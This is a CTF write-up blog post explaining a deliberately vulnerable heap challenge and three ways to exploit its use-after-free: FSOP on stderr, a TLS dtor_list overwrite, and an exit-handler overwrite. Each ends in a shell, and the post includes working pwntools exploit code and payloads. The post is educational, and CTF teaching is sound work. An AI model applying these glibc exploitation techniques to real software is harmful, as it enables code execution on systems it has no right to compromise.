<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Waheyyyyyyy</title>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#000084" />
    <link rel="icon" href="http://localhost:1313//favicon.ico">
    <link rel="canonical" href="http://localhost:1313/">
    
    
</head>
<body>
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
            <a class="brand" href="http://localhost:1313/">Waheyyyyyyy</a>
            <div class="nav-collapse collapse">
                <ul class="nav">
                    
                    
                        
                            <li>
                                <a href="/about/">
                                    
                                    <span>About</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/post/">
                                    
                                    <span>Posts</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/categories/writeup/">
                                    
                                    <span>Writeups</span>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
        </div>
    </div>
</nav><div id="content" class="container">

<div class="row-fluid navmargin">
    <div class="page-header">
        <h1>NYP Dec CTF 2025 Labubu 3 different ways - Wed, Dec 31, 2025</h1>
    </div>
    <p class="lead"></p>
    <h4 id="introduction">Introduction:</h4>
<p>labubu labubu labubububububu labubu labewbew labbubu labubu labu labubu labububub</p>
<p>Labubu translation: I wrote a beginner challenge for NYP Dec CTF 2025. It is meant to be a simple introduction to <strong>tcache poisoning</strong> with a small twist to force solvers to be more creative.</p>
<h4 id="table-of-contents">Table of Contents:</h4>
<ol>
<li>Prerequisites.</li>
<li>Binary and source code review.</li>
<li>Exploit(s)</li>
</ol>
<h4 id="prerequisites">Prerequisites:</h4>
<p>Go read this post on the basics of <a href="https://waheyy.github.io/post/liardancer/liardancerwriteup/">tcache poisoning.</a>
The only difference here is since the binary has the <strong>FULL RELRO</strong> protection enabled, the binary&rsquo;s <strong>Global Offset Table</strong> (GOT) cannot be written to so we have to get creative with our write-what-where.</p>
<h4 id="source-code-review">Source Code Review:</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define MAX_LABUBU 0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LABUBU_SIZE 0x400
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>labubu_holder[MAX_LABUBU] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span></code></pre></div><p>So here you can see that you can have 16 Labubus and each Labubu has a fixed size of 0x400 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">make_labubu</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;idx?: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_int</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> MAX_LABUBU <span style="color:#f92672">||</span> idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  labubu_holder[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(LABUBU_SIZE);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Your labubu has been bought!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>make_labubu()</code> allocates a chunk of size 0x400.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sell_labubu</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which labubu to sell...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_int</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> MAX_LABUBU <span style="color:#f92672">||</span> idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(labubu_holder[idx]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You monster...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><pre tabindex="0"><code></code></pre><p><code>sell_labubu()</code> frees a 0x400 byte chunk and you can see that I do not null the pointer so I have a dangling pointer that can be used in a Use-After-Free(UAF).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">name_labubu</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which labubu to name: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_int</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> MAX_LABUBU <span style="color:#f92672">||</span> idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (labubu_holder[idx] <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;There is no labubu there...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name your labubu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(labubu_holder[idx], LABUBU_SIZE, stdin);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Your labubu has been named %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, labubu_holder[idx]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>name_labubu()</code> lets you edit the 0x400 chunk. This lets me make use of the dangling pointer to edit memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">admire_labubu</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which limited edition 24k gold matcha performative labubu do you &#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;want to admire?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_int</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> MAX_LABUBU <span style="color:#f92672">||</span> idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (labubu_holder[idx] <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;There is no labubu there...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, labubu_holder[idx], LABUBU_SIZE);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>admire_labubu()</code> lets you read whatever that 0x400 byte chunk is holding.</p>
<h4 id="exploit">Exploit:</h4>
<p>I will be going through my intended solve of the challenge before going into the other methods we can use.</p>
<h4 id="1-first-we-need-a-heap-leak-so-we-can-bypass-the-pointer-mangling">1. First we need a heap leak, so we can bypass the <a href="https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking">pointer mangling.</a></h4>
<p>Pointer mangling is a security feature added in glibc 2.32 to protect singly-linked lists. By mangling the forward pointer of the chunks it is harder to overwrite it. However it is easily bypassed.</p>
<p>So first we allocate a chunk and then free it and read it since we have a UAF.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0</span>) <span style="color:#75715e">#one chunk allocated in heap.</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>) <span style="color:#75715e">#the chunk goes into tcache, the first 8 bytes becomes the forward pointer.</span>
</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>) <span style="color:#75715e">#now we can read it.</span>
</span></span><span style="display:flex;"><span>heapleak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Welcome&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)[:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>heapleak <span style="color:#f92672">=</span> u64(heapleak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;This is heap leak: </span><span style="color:#e6db74">{</span>hex(heapleak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>This makes it so that there is one chunk in tcache and once a chunk goes into tcache the first 8 bytes of the data section of chunk becomes the forward pointer. Since this chunk is the only chunk in the tcache its forward pointer is <strong>NULL</strong> and following the pointer mangle formula.</p>
<p><strong>fd = (chunk address &raquo; 12) ^ next chunk</strong></p>
<p>If next chunk is <strong>NULL</strong> then the fd stored inside the chunk will be <strong>(chunk_address &raquo; 12) ^ NULL</strong> which gives me <code>chunk_address &gt;&gt; 12</code> which is exactly what I need in a heap leak.</p>
<h4 id="2-we-now-need-a-libc-leak">2. We now need a Libc leak.</h4>
<p>Usually to get a Libc leak in heap challenges, we have to make use of a technique called the <strong>unsorted leak</strong>. The unsorted leak makes use of the fact that the first chunk to go into the unsorted bin has its fd and bk pointing into the Libc and then we can read it for the leak.</p>
<p>So to get a libc leak, we allocate a chunk that goes into the unsorted bin and free it. Once freed we can read it back and take the values which will point into <code>main_arena+96</code> inside Libc.</p>
<p><img src="/post/labubu/images/gdb_main_arena_offsets.jpeg" alt="gdb_main_arena_offsets"></p>
<p>But if you try to do the same thing here, you will find a problem. Your chunks go straight into tcache and you cannot control the size, what do you do?????</p>
<p>Since tcache bins can only take 7 chunks, we can actually fill up the tcache with 7 chunks and once tcache is filled the chunks will be freed into unsorted and we can perform our Libc leak.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>):
</span></span><span style="display:flex;"><span>    alloc(i) <span style="color:#75715e">#allocate 9 chunks. 7 chunks to fill, 1 chunk to free and last chunk for consolidation guard.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    free(i) <span style="color:#75715e">#free 7 chunks and now tcache is filled.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">7</span>) <span style="color:#75715e">#here we free the chunk so it goes into unsorted bin.</span>
</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">7</span>) <span style="color:#75715e">#and now we can read the fd or bk to get the Libc leak.</span>
</span></span><span style="display:flex;"><span>libcleak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Welcome&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)[:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>libcleak <span style="color:#f92672">=</span> u64(libcleak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;This is main_arena+96: </span><span style="color:#e6db74">{</span>hex(libcleak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>main_arena_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x210ac0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">96</span> <span style="color:#75715e">#rmb to change this to the specific libc of the container</span>
</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> libcleak <span style="color:#f92672">-</span> main_arena_offset
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;This is libc base: </span><span style="color:#e6db74">{</span>hex(base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p><img src="/post/labubu/images/main_arena_leak.jpeg" alt="main_arena_leak"></p>
<h4 id="3-tcache-poison-and-method-1">3. Tcache poison and Method 1:</h4>
<p>The intended method is to perform <strong>FSOP</strong> (file stream oriented programming). Since we the program ends with <code>exit()</code> we can find the address of <code>_IO_2_1_stderr_@@GLIBC_2.2.5</code> and use our tcache poison to overwrite it and when <code>exit()</code> is called and uses the file struct we gain code execution yay.</p>
<p>Now I will show you how i did my tcache poison.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit(<span style="color:#ae81ff">2</span>, p64(mangle(heapleak, stderr))) <span style="color:#75715e">#change the fd of a freed chunk to stderr</span>
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">13</span>) <span style="color:#75715e"># allocate chunks til I get my stderr struct back </span>
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">14</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">15</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">3</span>) <span style="color:#75715e">#this is my stderr struct back</span>
</span></span></code></pre></div><p>Now we can edit <code>stderr</code> to be anything and we just pass in a stderr FSOP payload, exit and yay, we pop shell.</p>
<p><img src="/post/labubu/images/fsop_win.jpeg" alt="fsopwin"></p>
<p>Here is my fsop payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fs <span style="color:#f92672">=</span> FileStructure()
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>flags <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">&#34;  &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;sh&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">6</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_lock <span style="color:#f92672">=</span> stderr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>chain <span style="color:#f92672">=</span> system
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_codecvt <span style="color:#f92672">=</span> stderr
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_wide_data <span style="color:#f92672">=</span> stderr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x48</span>
</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>vtable <span style="color:#f92672">=</span> io_wfile_jumps
</span></span></code></pre></div><h4 id="method-2">Method 2:</h4>
<p>Since I gave a 0x400 sized arbitrary write, you have a lot of options on how you want to pop the shell and we now we begin flexing on the challenge by solving it in other ways.</p>
<p><strong>Second method is a TLS-Storage dtor_list overwrite.</strong></p>
<p>When the program exits via <code>exit()</code> libc will execute <code>__run_exit_handlers()</code> which will call destructor functions (dtors) to cleanup before exiting. These functions are also mangled with the <code>PTR_MANGLE cookie</code> inside the <strong>Thread Local Storage</strong> (tls).</p>
<p>So in order to overwrite the <strong>dtor_list</strong> we must first leak the address of <strong>tls</strong> and then erase or leak the <code>PTR_MANGLE cookie</code>. It is also at this time we realise using the arb-alloc to leak addresses is getting annoying as we have to tcache poison each time we want to leak something, so we upgrade to a true arbitrary read using <code>stdout</code>.</p>
<p><img src="/post/labubu/images/stdout_offset.jpeg" alt="stdout_offset"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readmem</span>(addr, size):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xfbad1887</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(addr) <span style="color:#f92672">+</span> p64(addr<span style="color:#f92672">+</span>size)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(addr<span style="color:#f92672">+</span>size<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> temp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#since we have full control over the `stdout` struct we can overwrite it to give us a read.</span>
</span></span></code></pre></div><p>Refer to <a href="https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive">this</a> for details on the <code>stdout</code> leak.</p>
<p>Now we can just repeatedly overwrite <code>stdout</code> to let us read anywhere we want as many times as we want, no need to tcache poison again and again YIPEE.</p>
<p>So first, we leak address of <code>__nptl_rtld_global</code> which holds the address of <code>_rtld_global</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>, readmem(rtld, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>rtld_leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your labubu&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>rtld_leak <span style="color:#f92672">=</span> u64(rtld_leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is _rtld_global </span><span style="color:#e6db74">{</span>hex(rtld_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>initial_dtv <span style="color:#f92672">=</span> rtld_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xae8</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is initial_dtv </span><span style="color:#e6db74">{</span>hex(intial_dvt)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>, readmem(initial_dtv, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>tls_leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your labubu&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>tls_leak <span style="color:#f92672">=</span> u64(tls_leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9a0</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is tls leak </span><span style="color:#e6db74">{</span>hex(tls_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Now we have address of _rtld_global we can use the <code>initial_dtv</code> field inside <code>_rtld_global</code> as it holds a pointer into <code>tls</code> which has a constant offset to <code>tls</code> base so now equipped with the <code>tls</code> base address we can begin the overwriting.</p>
<p>Typing <code>p _rtld_global</code> in gdb (I use <a href="https://github.com/bata24/gef">bata24 gef</a>) shows you the struct.</p>
<p><img src="/post/labubu/images/initial_dtv.jpeg" alt="initial_dtv"></p>
<p>Something interesting of note is that the <code>dtor_list</code> is close to the <code>tls</code> so we can in one shot erase the <code>PTR_MANGLE cookie</code> and the <code>dtor_list</code>.</p>
<p>Here you can see the <code>tls</code> before the overwrite.</p>
<p><img src="/post/labubu/images/before_tls_overwrite.jpeg" alt="before_tls_overwrite"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> tls_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is target </span><span style="color:#e6db74">{</span>hex(target)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>system_mangle <span style="color:#f92672">=</span> system <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">17</span> <span style="color:#75715e">#this is how the pointers are mangled</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">=</span> p64(target<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">+=</span> p64(system_mangle)
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">+=</span> p64(binsh)
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">+=</span> p64(target<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">+</span> p64(target<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x9a0</span>) <span style="color:#f92672">+</span> p64(target<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>)
</span></span><span style="display:flex;"><span>fake <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
</span></span></code></pre></div><p>This is my payload.</p>
<p>And now we can perform another tcache poison and overwrite <code>tls</code> and then trigger the shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, p64(mangle(heapleak, target)))
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, fake)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
</span></span></code></pre></div><p><img src="/post/labubu/images/after_tls_overwrite.jpeg" alt="after_tls_overwrite"></p>
<p>Here you can see that the <code>PTR_MANGLE cookie</code> is completely 0 now due to our overwrite. We also have our <code>dtor_list -&gt; func</code> pointing to our <code>system()</code> and once called <code>system()</code> will take the thing below as its argument which is ever so conveniently <code>/bin/sh</code>. YIPEE!</p>
<p><img src="/post/labubu/images/dtor_win.jpeg" alt="dtor_win"></p>
<p>Easy win. This method is overkill for this challenge as it requires you to have at least one more tcache poison and leak a lot of more addresses when just simple FSOP would have worked.</p>
<h4 id="method-3">Method 3:</h4>
<p>Overwriting exit handlers is the last reasonable method I have for this challenge. This method is also known as the <code>initial+24</code> overwrite method.</p>
<p>We still need a <code>tls</code> leak so we do the same thing as the dtor_list overwrite to get our leak.</p>
<p>This time our second tcache poison is to overwrite the <code>PTR_MANGLE cookie</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#second poison</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, p64(mangle(heapleak, target))) <span style="color:#75715e">#target is the address of PTR_MANGLE cookie</span>
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0</span>))
</span></span></code></pre></div><p><img src="/post/labubu/images/cookie_null.jpeg" alt="cookie_null"></p>
<p>Now we can inspect our <code>initial</code> struct which tells us that this program will exit with flavour <strong>0x4</strong> which is <code>ef_cxa</code> so we just have to overwrite the <code>cxa</code> entry in <code>initial</code> to <code>system()</code> and its arguments to <code>/bin/sh</code> and we win.</p>
<p><img src="/post/labubu/images/before_initial_overwrite.jpeg" alt="before_initial_overwrite"></p>
